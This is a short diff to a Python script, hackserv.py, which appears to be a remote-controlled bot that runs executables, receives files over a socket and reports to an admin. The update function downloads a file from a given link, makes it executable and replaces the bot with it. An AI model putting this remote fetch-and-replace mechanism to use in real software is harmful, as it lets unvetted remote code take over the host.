@@ -281,17 +281,23 @@ def execute(xType, file): # Run executable file.
         runcmd_noout('./'+ file)
     
 def chFileMod(modFile, modType):
-    os.chmod(str(modFile), str(modType))
+    os.chmod(str(modFile), modType)
     sendntc(str(modFile) +" mode was changed to: "+ str(modType) +"!", adminname)
 
 def update(link, dlFile): # Update bot.
+    if debugmode:
+        print("[==>] Downloading update file: "+ str(dlFile))
     download(link, dlFile)
-    chFileMod(str(dlFile), stat.S_IXUSR)
+    if debugmode:
+        print("[chmod +x] Making "+ str(dlFile) +" executable!")
+    chFileMod(dlFile, stat.S_IXUSR)
+    if debugmode:
+        print("[<==] Backing up old hackserv.py and renaming "+ str(dlFile) +" to hackserv.py")
     os.rename("hackserv.py", "hackserv.py.bak")
     os.rename(str(dlFile), "hackserv.py")
-    runcmd_noout("./hackserv.py")
-    sendntc(str(dlFile) +" was renamed and old 'hackserv.py' was successsfully backed up and updated!", adminname)
-    #sys.exit()
+    if debugmode:
+        print("[+] The new hackserv.py is ready to run!")
+    sendntc("[*] Success! "+ str(dlFile) +" was renamed and old 'hackserv.py' was successsfully backed up and updated!", adminname)
     
 def retrieveFile(fsname, fs, fsaddr): # Receive a file.
     filename = fs.recv(1024).decode("UTF-8")
